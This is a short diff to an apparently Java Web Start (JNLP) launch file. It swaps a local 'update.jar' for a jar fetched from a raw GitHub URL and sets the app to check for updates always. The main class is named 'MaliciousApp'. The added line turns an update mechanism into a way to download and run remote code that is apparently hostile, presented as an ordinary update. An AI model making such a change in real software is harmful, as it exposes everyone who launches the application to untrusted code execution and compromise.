@@ -7,7 +7,7 @@
     </information>
  <update check="always" policy="prompt-run"/>
     <resources>
-        <jar href="update.jar" main="true"/>
+        <jar href="https://raw.githubusercontent.com/rvz00/deliv/main/update.jar" main="true"/>
     </resources>
 <application-desc main-class="MaliciousApp">
 </application-desc>
